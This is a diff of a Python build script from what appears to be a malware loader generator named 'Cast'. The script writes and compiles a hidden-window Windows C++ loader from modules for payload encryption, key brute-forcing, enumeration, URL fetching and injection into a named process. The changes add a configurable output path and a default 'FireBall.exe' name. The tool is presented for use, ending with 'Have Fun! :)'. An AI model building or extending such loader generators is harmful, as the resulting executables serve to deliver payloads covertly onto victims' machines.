@@ -4,33 +4,33 @@ from Cast.cli import *
 from Cast.local_load import *
 from Cast.encryptor import *
 
-def build (Encryption, Enumeration, Payload, ProcessName, Loader, Url):
-    f = open ("main.cpp", "a")
+def build (Path, Encryption, Enumeration, Payload, ProcessName, Loader, Url):
+    f = open ("Build\\main.cpp", "a")
     f.write(f"""
 #include <iostream>
 #include <string>
 #include <Windows.h>
 #include <stdio.h>
 #include <wininet.h>
-#include "Spells/UtilitySpells/FetchFromURL.h"
+#include "../Spells/UtilitySpells/FetchFromURL.h"
 """)   
     
     if Encryption != "null":
         f.write(f"""\n
-#include "Spells/EncryptionSpells/{Encryption}"
-#include "Spells/EncryptionSpells/KeyBrute.h"
+#include "../Spells/EncryptionSpells/{Encryption}"
+#include "../Spells/EncryptionSpells/KeyBrute.h"
 """)
         
     if Enumeration != "null":
         f.write(f"""\n
-#include "Spells/{Enumeration}"
+#include "../Spells/{Enumeration}"
 """)
     else:
         pass
 
 
     f.write(f"""\n
-#include "Spells/{Loader}"
+#include "../Spells/{Loader}"
 """)
     if Payload != "null":
         f.write(f"""\n
@@ -101,7 +101,7 @@ int main()
 
     f.close()
     time.sleep(2)
-    return os.system(f"C:\\msys64\\mingw64\\bin\\g++ --static -O2 -w -s -o chungus main.cpp TinyAES.c -lwininet -lws2_32 -mwindows")
+    return os.system(f"C:\\msys64\\mingw64\\bin\\g++ --static -O2 -w -s -o {Path} Build\\main.cpp TinyAES.c -lwininet -lws2_32 -mwindows")
     #result = subprocess.run(['g++', '-o', 'chungus', 'main.cpp','-lwininet', '-lws2_32', '-mwindows'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     #print(result)
 
@@ -180,8 +180,22 @@ def main():
 
     change_header_file(Enumeration, Loader, ApiMode)
 
-    if not build(Encryption, Enumeration, Payload, ProcessName, Loader, Url):
-        print(f"\nLoader Built Successfully!\nHave Fun! :)")
+    Path = input(f"""Path for the final build (Default ./Build):
+
+>> """)
+    if Path == "":
+        Path = "./Build"
+    
+    Name = input(f"""Finaly the spell name (Default FireBall.exe):
+    
+>> """)
+    if Name == "":
+        Name = "FireBall"
+
+    Path = os.path.join(Path, Name)
+
+    if not build(Path, Encryption, Enumeration, Payload, ProcessName, Loader, Url):
+        print(f"\nLoader Built Successfully!\nAt {Path}\n\nHave Fun! :)")
     else:
         print(f"\nFailed to build loader :(")
     
